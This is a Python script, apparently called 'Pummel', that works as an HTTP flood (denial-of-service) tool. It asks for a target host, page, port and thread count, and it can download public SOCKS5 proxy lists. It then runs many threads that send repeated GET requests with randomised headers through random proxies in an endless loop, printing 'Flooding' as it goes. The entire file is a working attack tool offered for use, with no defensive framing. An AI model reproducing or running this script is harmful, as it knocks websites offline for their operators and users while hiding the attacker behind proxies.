#!/usr/bin/python3
#Coded by HC The Chlous
import threading
import random
import time
import socket
import sys
import requests 
import socks

print('''\r\n
  _____                                _ 
 |  __ \                              | |
 | |__) |   _ _ __ ___  _ __ ___   ___| |
 |  ___/ | | | '_ ` _ \| '_ ` _ \ / _ \ |
 | |   | |_| | | | | | | | | | | |  __/ |
 |_|    \__,_|_| |_| |_|_| |_| |_|\___|_|
 ========================================
 version 0.0.1
                    Code By HC the Chlous
 ========================================
 Github: https://github.com/HC133/Pummel \r\n''')

ip = str(input("Address/Host:"))
page = str(input("Page:"))
port = int(input("Port:"))
thread_num = int(input("Threads:"))
N = str(input("Do you need to download socks5 list ?(y/n):"))
if N == 'y':
    f = open("socks5.txt", 'wb')
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
        f.write(r.content)
        f.close()
    except:
        f.close()
    print("Socks Downloaded Sucessful !")
else:
    pass
out_file = str(input("Enter Proxy File Path(socks5.txt):"))
if out_file == '':
    out_file = str("socks.txt")
else:
    out_file = str(out_file)
print ("Number Of Proxies: %s" %(len(open(out_file).readlines())))
time.sleep(0.3)
multiple = int(input("Input the Multiple:"))

acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

proxies = open(out_file).readlines()

def run():
    get_host = "GET " + page + " HTTP/1.1\r\nHost: " + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    accept = random.choice(acceptall)
    request = get_host + accept + connection + "\r\n"
    proxy = random.choice(proxies).strip().split(":")
    while True:
        try:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
            s = socks.socksocket()
            s.connect((str(ip), int(port)))
            s.send(str.encode(request))
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

n=0

for i in range(thread_num):
    th = threading.Thread(target=run,daemon=True)
    th.start()

while True:
    key = ["-","\\","|","/","-"]
    try:
        if n>=4:
            n = 0
        time.sleep(0.1)
        sys.stdout.write("["+str(key[n])+"]Flooding "+ip+page+":"+str(port)+"\r")
        sys.stdout.flush()
        n +=1
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()
        break
#Code By HC the Chlous